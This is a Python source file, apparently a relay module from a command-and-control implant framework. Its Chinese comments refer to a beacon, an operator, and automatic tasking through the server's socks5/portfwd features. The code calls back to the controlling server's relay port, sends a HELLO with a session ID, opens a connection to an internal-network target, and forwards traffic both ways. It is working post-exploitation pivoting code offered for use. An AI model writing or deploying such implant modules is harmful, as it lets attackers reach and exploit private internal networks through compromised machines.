"""
@module: relay
@desc: 中继通道（13/14）：连 server relay 端口 → HELLO → 连内网目标 → 双向转发
由 server 端 socks5/portfwd 自动下发，操作员无需手动调用。
"""
import socket
import threading

MODULE = {
    "desc": "中继通道（socks5/portfwd 自动下发，双向转发）",
    "params": [("conn_id", "必填；中继会话 ID"),
               ("relay_port", "必填；server relay 端口"),
               ("target", "必填；目标 host:port")],
}


def run(conn_id, relay_port, target):
    try:
        # _H = beacon 全局（server 地址）；relay 端口由任务参数指定
        r = socket.create_connection((_H, int(relay_port)), timeout=15)
    except Exception as e:
        return f"(relay error: 连 relay 失败 {e})"
    try:
        r.sendall(f"HELLO {conn_id}\n".encode())
        th, tp = target.rsplit(":", 1)
        t = socket.create_connection((th, int(tp)), timeout=15)

        def fwd(src, dst):
            try:
                while True:
                    data = src.recv(65536)
                    if not data:
                        break
                    dst.sendall(data)
            except OSError:
                pass
            finally:
                try:
                    dst.shutdown(socket.SHUT_WR)
                except OSError:
                    pass

        threading.Thread(target=fwd, args=(t, r), daemon=True).start()
        fwd(r, t)
        return "(relay closed)"
    except Exception as e:
        return f"(relay error: {e})"
    finally:
        try:
            r.close()
        except OSError:
            pass
